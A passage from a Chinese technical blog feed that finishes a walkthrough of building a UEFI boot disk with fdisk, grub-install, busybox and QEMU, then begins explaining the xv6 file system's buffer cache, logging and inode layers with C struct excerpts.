</span><br><span class="line">Last sector, +/-sectors or +/-size&#123;K,M,G,T,P&#125; (2048-4194270, default 4194270): +256M</span><br><span class="line"></span><br><span class="line">Created a new partition 1 of <span class="built_in">type</span> <span class="string">&#x27;Linux filesystem&#x27;</span> and of size 256 MiB.</span><br><span class="line">Partition <span class="comment">#1 contains a vfat signature.</span></span><br><span class="line"></span><br><span class="line">Do you want to remove the signature? [Y]es/[N]o: y</span><br><span class="line"></span><br><span class="line">The signature will be removed by a write <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): n</span><br><span class="line">Partition number (2-128, default 2): </span><br><span class="line">First sector (526336-4194270, default 526336): </span><br><span class="line">Last sector, +/-sectors or +/-size&#123;K,M,G,T,P&#125; (526336-4194270, default 4194270): </span><br><span class="line"></span><br><span class="line">Created a new partition 2 of <span class="built_in">type</span> <span class="string">&#x27;Linux filesystem&#x27;</span> and of size 1.8 GiB.</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): t</span><br><span class="line">Partition number (1,2, default 2): 1</span><br><span class="line">Partition <span class="built_in">type</span> (<span class="built_in">type</span> L to list all types): 1</span><br><span class="line"></span><br><span class="line">Changed <span class="built_in">type</span> of partition <span class="string">&#x27;Linux filesystem&#x27;</span> to <span class="string">&#x27;EFI System&#x27;</span>.</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): t</span><br><span class="line">Partition number (1,2, default 2): </span><br><span class="line">Partition <span class="built_in">type</span> (<span class="built_in">type</span> L to list all types): 24</span><br><span class="line"></span><br><span class="line">Changed <span class="built_in">type</span> of partition <span class="string">&#x27;Linux filesystem&#x27;</span> to <span class="string">&#x27;Linux root (x86-64)&#x27;</span>.</span><br><span class="line"></span><br><span class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): w</span><br><span class="line">The partition table has been altered.</span><br><span class="line">Calling ioctl() to re-read partition table.</span><br><span class="line">Syncing disks.</span><br></pre></td></tr></table></figure></li><li>初始化文件系统<br>这里在两个分区上初始化为<strong>FAT32</strong>文件系统和<strong>EXT2</strong>文件系统，从而存储启动设置等文件<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hawk@xiaoxin:~/Desktop$ <span class="built_in">sudo</span> mkfs.vfat -F 32 /dev/loop11p1 </span><br><span class="line">mkfs.fat 4.1 (2017-01-24)</span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop$ <span class="built_in">sudo</span> mkfs.ext2 /dev/loop11p2 </span><br><span class="line">mke2fs 1.45.5 (07-Jan-2020)</span><br><span class="line">Discarding device blocks: <span class="keyword">done</span>                            </span><br><span class="line">Creating filesystem with 458491 4k blocks and 114688 inodes</span><br><span class="line">Filesystem UUID: d59e6ba7-6bce-4cbe-ab6f-44d778c3fbe6</span><br><span class="line">Superblock backups stored on blocks: </span><br><span class="line">32768, 98304, 163840, 229376, 294912</span><br><span class="line"></span><br><span class="line">Allocating group tables: <span class="keyword">done</span>                            </span><br><span class="line">Writing inode tables: <span class="keyword">done</span>                            </span><br><span class="line">Writing superblocks and filesystem accounting information: <span class="keyword">done</span> </span><br></pre></td></tr></table></figure></li><li>安装<strong>BootLoader</strong><br>即调用<strong>grub-install</strong>，命令如下所示<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">hawk@xiaoxin:~/Desktop$ <span class="built_in">sudo</span> mount -o rw /dev/loop11p1 mnt/</span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop$ <span class="built_in">sudo</span> grub-install --efi-directory=mnt --boot-directory=mnt --removable </span><br><span class="line">Installing <span class="keyword">for</span> x86_64-efi platform.</span><br><span class="line">Installation finished. No error reported.</span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop$ tree -d mnt/</span><br><span class="line">1 [error opening <span class="built_in">dir</span>]</span><br><span class="line">mnt/</span><br><span class="line">├── EFI</span><br><span class="line">│   └── BOOT</span><br><span class="line">└── grub</span><br><span class="line">    ├── fonts</span><br><span class="line">    └── x86_64-efi</span><br><span class="line"></span><br><span class="line">5 directories</span><br></pre></td></tr></table></figure>这里简单解释一下<strong>grub-install</strong>命令中的部分参数<ul><li><strong>—boot-directory=mnt</strong>: 即<strong>grub设置文件</strong>被安装的位置，这部分数据是<strong>grub</strong>已经加载完相关模块(如磁盘分区模块、文件系统模块)后加载的，因此参数值是<strong>文件系统的目录项</strong>名称</li><li><strong>—efi-directory=mnt</strong>: 即<strong>BootLoader</strong>被安装的路径。不同于<strong>BIOS</strong>，<strong>UEFI</strong>可以识别<strong>磁盘分区</strong>和<strong>文件系统</strong>，因此参数值是<strong>BootLoader</strong>所在的<strong>文件系统的目录项</strong>名称</li></ul></li><li><p>设置配置文件<br><strong>grub</strong>在启动时，会读取<strong>{boot_directory}/grub/grub.cfg</strong>的配置文件，从而执行相应的操作<br>因此，我们需要在相关的路径下，参考<a href="https://www.gnu.org/software/grub/manual/grub/grub.html#Configuration">grub官方文档</a>初始化一个<strong>grub.cfg</strong>，如下所示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">hawk@xiaoxin:~/Desktop$ lsblk -o +UUID</span><br><span class="line">NAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINT                   UUID</span><br><span class="line">loop11         7:9    0     2G  0 loop                              </span><br><span class="line">├─loop11p1   259:5    0   256M  0 part /home/hawk/Desktop/mnt       C573-58EB</span><br><span class="line">└─loop11p2   259:6    0   1.8G  0 part                              d59e6ba7-6bce-4cbe-ab6f-44d778c3fbe6</span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop$ <span class="built_in">cat</span> mnt/grub/grub.cfg </span><br><span class="line">menuentry <span class="string">&quot;v6.0-rc6&quot;</span> &#123;</span><br><span class="line">   insmod /grub/x86_64-efi/ext2.mod</span><br><span class="line">   search --fs-uuid --<span class="built_in">set</span>=root d59e6ba7-6bce-4cbe-ab6f-44d778c3fbe6</span><br><span class="line">   linux /v6.0-rc6/bzImage</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，<strong>grub.cfg</strong>有一个菜单项，其会首先加载相关的模块(以<strong>{boot_directory}</strong>作为根目录)，然后尝试切换根目录到指定<strong>uuid</strong>的<strong>文件系统</strong>实例，加载相应路径下的内核。而相关的<strong>文件系统</strong>实例内容如下所示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hawk@xiaoxin:~/Desktop$ <span class="built_in">sudo</span> mount -o rw /dev/loop11p2 disk</span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop$ tree disk</span><br><span class="line">disk</span><br><span class="line">├── lost+found [error opening <span class="built_in">dir</span>]</span><br><span class="line">└── v6.0-rc6</span><br><span class="line">    └── bzImage</span><br><span class="line"></span><br><span class="line">2 directories, 1 file</span><br><span class="line">hawk@xiaoxin:~/Desktop$ </span><br></pre></td></tr></table></figure><p>这里需要特别说明，需要按照<a href="https://docs.kernel.org/x86/x86_64/uefi.html">Linux官方文档</a>，编译支持<strong>UEFI</strong>的<strong>Linux内核</strong>。此时，一个启动盘已经构建好了，可以参考<a href="https://www.qemu.org/docs/master/system/index.html">QEMU官方文档</a>和<a href="https://github.com/tianocore/edk2">UEFI固件项目</a>，使用如下所示的<strong>QEMU</strong>启动脚本进行测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hawk@xiaoxin:~/Desktop$ <span class="built_in">cat</span> start.sh </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">   -bios /usr/share/ovmf/OVMF.fd \</span><br><span class="line">   -m 4G \</span><br><span class="line">-drive file=disk.img,index=0,media=disk</span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop$ ./start.sh</span><br></pre></td></tr></table></figure><p><img src="qemu-uefi1.png" alt="UEFI下qemu测试"></p></li><li><p>创建根文件系统<br>如果没有指定<strong>根文件系统</strong>，则<strong>Linux内核</strong>无法正常加载<strong>文件系统模块</strong>，如下所示<br><img src="qemu-uefi2.png" alt="未指定根文件系统"></p><p>这里使用<a href="https://busybox.net/">busybox</a>，构建一个简单的<strong>根文件目录</strong>，并更新相关的设置文件即可，如下所示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">hawk@xiaoxin:~/Desktop/busybox-1.35.0/_install$ <span class="built_in">ls</span></span><br><span class="line">bin  init  linuxrc  sbin  usr</span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop/busybox-1.35.0/_install$ <span class="built_in">cat</span> init </span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="built_in">exec</span> /bin/sh</span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop/busybox-1.35.0/_install$ <span class="built_in">sudo</span> sh -c <span class="string">&#x27;find . | cpio -o --format=newc &gt; /home/hawk/Desktop/disk/v6.0-rc6/rootfs.cpio&#x27;</span></span><br><span class="line">5390 blocks</span><br><span class="line"></span><br><span class="line">hawk@xiaoxin:~/Desktop/busybox-1.35.0/_install$ <span class="built_in">cat</span> ~/Desktop/mnt/grub/grub.cfg </span><br><span class="line">menuentry <span class="string">&quot;v6.0-rc6&quot;</span> &#123;</span><br><span class="line">   insmod /grub/i386-pc/ext2.mod</span><br><span class="line">   search --fs-uuid --<span class="built_in">set</span>=root d59e6ba7-6bce-4cbe-ab6f-44d778c3fbe6</span><br><span class="line">   linux /v6.0-rc6/bzImage</span><br><span class="line">   initrd /v6.0-rc6/rootfs.cpio</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，可以正常进入<strong>Linux</strong>的<strong>bash</strong>，如下图所示<br><img src="qemu-uefi3.png" alt="包含根文件系统"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 内核 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 内核 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xv6-九</title>
      <link href="/2022/09/02/xv6-%E4%B9%9D/"/>
      <url>/2022/09/02/xv6-%E4%B9%9D/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这篇博客研究<strong>xv6</strong>的<strong>文件系统</strong>机制</p><h1 id="文件系统总览"><a href="#文件系统总览" class="headerlink" title="文件系统总览"></a>文件系统总览</h1><p>文件系统是用来管理<strong>持久型</strong>数据的子系统。<br>由于其需要解决很多问题，所以其抽象层次非常复杂，如下所示<br><img src="fs.png" alt="文件系统抽象层次"></p><p>另一方面，文件系统也被称为<strong>on-disk data structure</strong>，其需要在磁盘中以一定的数据结构进行组织，从而可以让操作系统高效的将文件系统<strong>导出到</strong>磁盘或从<strong>磁盘</strong>导入到内存中，如下所示<br><img src="disk.png" alt="磁盘数据布局"></p><h2 id="Disk-Layer"><a href="#Disk-Layer" class="headerlink" title="Disk Layer"></a>Disk Layer</h2><h3 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h3><p><strong>Disk Layer</strong>用于抽象对磁盘的读写<br>一般情况下，操作系统通过对磁盘的端口寄存器进行读写，从而完成对磁盘状态的控制和数据的读写。这也就是驱动</p><p>由于现实中有各种各样的磁盘，从而需要各种各样的驱动程序。为了隐藏这些实现细节，则通过<strong>Disk Layer</strong>将其抽象成统一的接口，即名称相同的函数指针<br>在驱动初始化时，将这些指针覆盖为驱动自己的函数。之后调用这些统一的接口，则相当于直接调用这些驱动的函数，从而将不同的驱动实现统一为了相同的接口</p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>由于目前<strong>xv6</strong>仅仅涉及到<strong>QEMU</strong>的<strong>virtio disk</strong>设备，因此其仅仅实现了位于<strong>kernel/virtio_disk.c</strong>的该设备的驱动函数<strong>virtio_disk_rw()</strong>，并将其当做<strong>Disk Layer</strong>的接口</p><p>即当<strong>xv6</strong>需要读、写磁盘时，其会调用<strong>virtio_disk_rw()</strong>函数完成</p><h2 id="Buffer-Cache-Layer"><a href="#Buffer-Cache-Layer" class="headerlink" title="Buffer Cache Layer"></a>Buffer Cache Layer</h2><h3 id="设计-1"><a href="#设计-1" class="headerlink" title="设计"></a>设计</h3><p>由于磁盘读、写速度相比较内存访问慢很多，因此操作系统会缓存频繁访问的磁盘的<strong>block</strong>，从而避免每次重新从磁盘中缓慢的读取数据</p><p>而为了保证正确性，操作系统需要确保任何时候，操作系统中任何磁盘的<strong>block</strong>有至多一个<strong>cache</strong>；任何一个<strong>block</strong>的<strong>cache</strong>同时被至多一个进程访问。这些可以通过<a href="/2022/07/13/xv6-%E5%85%AB/" title="xv6-八">xv6-八</a>介绍的<strong>锁机制</strong>实现</p><p>一般情况下，操作系统中使用<strong>固定数量</strong>的<strong>buffer</strong>来缓存磁盘的<strong>block</strong>。当操作系统访问不在<strong>cache</strong>中的<strong>block</strong>时，其可能需要覆盖掉其他的<strong>buffer</strong>。为了尽可能减少读取磁盘的次数，每次选择覆盖掉<strong>Least Recently Used</strong>的<strong>buffer</strong>进行覆盖，因为一般<strong>Least Recently Used</strong>的<strong>buffer</strong>，也是最不可能再被重复使用的<strong>buffer</strong></p><h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><h4 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h4><p><strong>xv6</strong>使用位于<strong>kernel/buf.h</strong>的<strong>struct buf</strong>结构体表示每一个<strong>buffer</strong>，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/fs.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BSIZE 1024  <span class="comment">// block size</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// kernel/buf.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buf</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> valid;   <span class="comment">// has data been read from disk?</span></span><br><span class="line">  <span class="type">int</span> disk;    <span class="comment">// does disk &quot;own&quot; buf?</span></span><br><span class="line">  uint dev;</span><br><span class="line">  uint blockno;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sleeplock</span> <span class="title">lock</span>;</span></span><br><span class="line">  uint refcnt;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">prev</span>;</span> <span class="comment">// LRU cache list</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> *<span class="title">next</span>;</span></span><br><span class="line">  uchar data[BSIZE];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><strong>xv6</strong>使用位于<strong>kernel/bio.c</strong>的<strong>bcache</strong>结构，抽象整个<strong>Buffer Cache Layer</strong>, 如下所示。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/bio.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">buf</span>[<span class="title">NBUF</span>];</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Linked list of all buffers, through prev/next.</span></span><br><span class="line">  <span class="comment">// Sorted by how recently the buffer was used.</span></span><br><span class="line">  <span class="comment">// head.next is most recent, head.prev is least.</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">buf</span> <span class="title">head</span>;</span></span><br><span class="line">&#125; bcache;</span><br></pre></td></tr></table></figure></p><p>其中，<strong>xv6</strong>将<strong>Buffer Cache Layer</strong>中所有<strong>buffer</strong>通过静态数组的形式定义，并通过<strong>buffer</strong>的<strong>prev</strong>字段和<strong>next</strong>字段组织成双向链表。其中<strong>bcache.head</strong>的<strong>next</strong>方向是<strong>Less Recently Used</strong>的<strong>buffer</strong>(即<strong>bcache.head.next</strong>是<strong>Most Recently Used</strong>)；而<strong>prev</strong>恰恰相反，是<strong>More Recently Used</strong>(即<strong>bcache.head.prev</strong>是<strong>Least Recently Used</strong>)</p><h4 id="bget"><a href="#bget" class="headerlink" title="bget()"></a>bget()</h4><p><strong>Buffer Cache Layer</strong>中最重要的两个函数就是位于<strong>kernel/bio.c</strong>的<strong>bget()</strong>和<strong>brelse()</strong></p><p>其中，<strong>bget()</strong>，顾名思义，会从<strong>Buffer Cache Layer</strong>中申请一个指定设备的指定<strong>block</strong>的<strong>buffer</strong>。这里有几点需要特别注意</p><ol><li>当前待缓存的<strong>block</strong>，可能已经在<strong>Buffer Cache Layer</strong>中被缓存；或者在被释放的某个<strong>buffer</strong>，其仍然保留该<strong>block</strong>的缓存数据，未被清除。为了尽可能减少磁盘读取次数，则优先返回这些<strong>buffer</strong>，并使用其上的数据即可。由于当前访问的<strong>block</strong>，往往之前也会被访问，则基于<strong>Least Recently Used</strong>算法，从<strong>bcache.head.next</strong>(即<strong>Most Recently Used</strong>)，沿着<strong>next</strong>方向(即<strong>Less Recently Used</strong>)遍历即可</li><li>当申请到<strong>buffer</strong>后，再返回前需要获取锁，从而确保任何时候任何<strong>buffer</strong>，仅会被至多一个进程操作。如果有多个进程操作，可能会出现一个进程写；另一个进程读的情况，从而导致数据不一致</li></ol><h4 id="brelse"><a href="#brelse" class="headerlink" title="brelse()"></a>brelse()</h4><p><strong>brelse()</strong>，当<strong>xv6</strong>使用完<strong>buffer</strong>后，则<strong>xv6</strong>需要调用此函数释放<strong>buffer</strong></p><p>为了实现减少磁盘的读、写，这里释放<strong>buffer</strong>时，需要注意如下几点：</p><ol><li>释放<strong>buffer</strong>时，仅仅释放获取的<strong>lock</strong>和<strong>计数引用</strong>，其余诸如设备号、块号和块内容等不能清除，因为后续可能会快被重新使用</li><li>考虑到当前访问的块，很可能马上被继续访问，则将当前<strong>buffer</strong>移动到<strong>bcache.head.next</strong>位置(即<strong>Most Recently Used</strong>)，从而方便<strong>bget()</strong>复用这些数据</li></ol><h4 id="bread-bwrite"><a href="#bread-bwrite" class="headerlink" title="bread()/bwrite()"></a>bread()/bwrite()</h4><p>这里的逻辑很简单，通过<strong>Device Layer</strong>的<strong>virtio_disk_rw()</strong>，即可将磁盘的数据读入<strong>buffer</strong>；或将<strong>buffer</strong>中的数据写到磁盘中即可</p><p>需要注意的是，为了确保任何时候任何<strong>buffer</strong>被至多一个进程访问，其需要在上锁的情况下调用<strong>virtio_disk_rw()</strong></p><h2 id="Logging-Layer"><a href="#Logging-Layer" class="headerlink" title="Logging Layer"></a>Logging Layer</h2><h3 id="设计-2"><a href="#设计-2" class="headerlink" title="设计"></a>设计</h3><p><strong>Logging Layer</strong>用于文件系统的<strong>Crash Recovery</strong></p><p>在文件系统进行一系列的磁盘写入工作时，崩溃(如突然断电等)的发生会导致磁盘数据的不一致。操作系统往往会通过<strong>Logging Layer</strong>来解决这类问题</p><p>在正式进行磁盘的写入工作前，操作系统现将计划要写入的数据以<strong>log</strong>的形式写入磁盘中。当所有的<strong>log</strong>都成功写入后，再向磁盘中写入一个特殊的<strong>commit</strong>记录，表示当前<strong>log</strong>成功写入。之后开始正式的磁盘写入工作，当操作系统完成所有的磁盘写入工作后，操作系统会清除掉瓷盘中的<strong>log</strong>，表示本次写入的完成</p><p>通过<strong>Logging Layer</strong>，即使发生<strong>Crash</strong>，在每次操作系统重启时，也能恢复文件系统的一致性。更具体地说，如果重启后，磁盘中存在特殊的<strong>commit</strong>，则根据保存的<strong>log</strong>，重新执行磁盘的<strong>写入</strong>工作。对于其余的情况，则操作系统认为要么写入工作还没开始，要么已经成功完成，并不会导致磁盘的非一致性错误，则无需处理</p><h3 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h3><h4 id="结构体-1"><a href="#结构体-1" class="headerlink" title="结构体"></a>结构体</h4><p><strong>xv6</strong>使用位于<strong>kernel/buf.c</strong>的<strong>struct log</strong>来描述<strong>Logging Layer</strong>，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// The log is a physical re-do log containing disk blocks.</span></span><br><span class="line"><span class="comment">// The on-disk log format:</span></span><br><span class="line"><span class="comment">//   header block, containing block #s for block A, B, C, ...</span></span><br><span class="line"><span class="comment">//   block A</span></span><br><span class="line"><span class="comment">//   block B</span></span><br><span class="line"><span class="comment">//   block C</span></span><br><span class="line"><span class="comment">//   ...</span></span><br><span class="line"><span class="comment">// Log appends are synchronous.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Contents of the header block, used for both the on-disk header block</span></span><br><span class="line"><span class="comment">// and to keep track in memory of logged block# before commit.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">logheader</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="type">int</span> block[LOGSIZE];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">log</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="type">int</span> start;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">  <span class="type">int</span> outstanding; <span class="comment">// how many FS sys calls are executing.</span></span><br><span class="line">  <span class="type">int</span> committing;  <span class="comment">// in commit(), please wait.</span></span><br><span class="line">  <span class="type">int</span> dev;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">logheader</span> <span class="title">lh</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">log</span> <span class="title">log</span>;</span></span><br></pre></td></tr></table></figure></p><p>这里需要特别注意的是，由于文件系统需要在内存或磁盘上导出或加载。因此文件系统的<strong>on-disk</strong>结构和<strong>in-memory</strong>结构有极大的关联性，但是往往也有较大的不一致。因为<strong>in-memory</strong>结构除了需要包含<strong>on-disk</strong>的数据，还需要包含一些运算所需要的数据结构，诸如<strong>spinlock</strong>等的结构会出现在<strong>in-memory</strong>结构，而不会出现在<strong>on-disk</strong>结构中</p><h4 id="begin-op"><a href="#begin-op" class="headerlink" title="begin_op()"></a>begin_op()</h4><p>在<strong>xv6</strong>的<strong>Logging Layer</strong>中，<strong>log</strong>的典型用法如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">begin_op();</span><br><span class="line">...</span><br><span class="line">bp = bread(...);</span><br><span class="line">bp-&gt;data[...] = ...;</span><br><span class="line">log_write(bp);</span><br><span class="line">...</span><br><span class="line">end_op();</span><br></pre></td></tr></table></figure></p><p>顾名思义，位于<strong>kernel/log.c</strong>的<strong>begin_op()</strong>函数表示写磁盘的<strong>准备操作</strong></p><p><strong>begin_op()</strong>需要在<strong>Logging Layer</strong>中申请<strong>log</strong>空间。为此，其需要获取相关的自旋锁，从而互斥的判断相关字段即可</p><p>这里需要特别说明的是，<strong>begin_op()</strong>和<strong>end_op()</strong>之间因当包含完整的<strong>写操作</strong>，即仅仅执行这些操作，仍然能保持磁盘数据的一致性。如果一次要写入的数据特别多，则应该拆分成诸如<strong>kernel/file.c</strong>的<strong>filewrite()</strong>的多个<strong>“原子”写操作</strong></p><h4 id="log-write"><a href="#log-write" class="headerlink" title="log_write()"></a>log_write()</h4><p>位于<strong>kenel/log.c</strong>的<strong>log_write()</strong>函数，将在正式执行<strong>写磁盘</strong>操作前，将要更新的<strong>block</strong>序号，写入到相关的<strong>in-memory</strong>的<strong>log</strong>数据中</p><p>这里需要特别注意的是，<strong>log_write()</strong>需要调用<strong>bpin()</strong>，增加相关<strong>block</strong>序号的<strong>buffer</strong>的引用计数，从而避免其被后续<strong>brelse()</strong>释放<strong>buffer()</strong>，导致更新内容丢失</p><h4 id="end-op"><a href="#end-op" class="headerlink" title="end_op()"></a>end_op()</h4><p>顾名思义，位于<strong>kernel/log.c</strong>的<strong>end_op()</strong>函数表示完成<strong>log</strong>的写入，将正式开始<strong>写磁盘</strong>操作</p><p>而<strong>写磁盘</strong>操作也分为以下几部分</p><ol><li>将此次<strong>写磁盘</strong>涉及的<strong>block</strong>数据(<strong>buffer</strong>中的更新数据)写入到磁盘的<strong>log</strong>部分</li><li>将当前的<strong>in-memory</strong>的<strong>log</strong>对象(主要是<strong>log header</strong>数据)写入到<strong>on-disk</strong>的<strong>log</strong>对象中。这也是前面提到的特殊的<strong>commit</strong>内容</li><li>将此次<strong>写磁盘</strong>涉及的<strong>block</strong>数据(<strong>buffer</strong>中的更新数据)写入到磁盘的<strong>data</strong>部分</li><li>清空<strong>in-memory</strong>的<strong>log header</strong>，并将其写入到<strong>on-disk</strong>的<strong>log</strong>对象，彻底完成一次<strong>写磁盘</strong>操作</li></ol><h2 id="Inode-Layer"><a href="#Inode-Layer" class="headerlink" title="Inode Layer"></a>Inode Layer</h2><h3 id="设计-3"><a href="#设计-3" class="headerlink" title="设计"></a>设计</h3><p><strong>Inode Layer</strong>用来抽象文件系统中的<strong>文件项</strong></p><p>正如前面所说的，文件系统的部分抽象层，往往包括<strong>in-memory</strong>表示和<strong>on-disk</strong>表示，而且<strong>in-memory</strong>表示往往比<strong>on-disk</strong>表示多了一些操作所需要的必须的数据结构,<strong>Inode Layer</strong>也不例外。对于<strong>on-disk</strong>的<strong>inode</strong>，其是描述一个文件或目录的大小和<strong>data block</strong>信息的数据结构；对于<strong>in-memory</strong>的<strong>inode</strong>，其就是<strong>on-disk</strong>的<strong>inode</strong>的拷贝，并且附带前面所说的内核所需要的必要结构信息</p><p>这里需要特别说明，为了减少磁盘读、写从而提高性能，操作系统会缓存<strong>inode</strong>，类似于<strong>Buffer Cache Layer</strong>——即释放<strong>inode</strong>时，仅仅减少该结构的引用计数，直到引用计数为0才最终释放<strong>inode</strong></p><h3 id="实现-3"><a href="#实现-3" class="headerlink" title="实现"></a>实现</h3><h4 id="结构体-2"><a href="#结构体-2" class="headerlink" title="结构体"></a>结构体</h4><p><strong>xv6</strong>使用位于<strong>kernel/fs.h</strong>的<strong>struct dinode</strong>描述<strong>on-disk</strong>的<strong>inode</strong>；使用位于<strong>kernel/file.h</strong>的<strong>struct inode</strong>描述<strong>in-memory</strong>的<strong>inode</strong>，如下所示<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 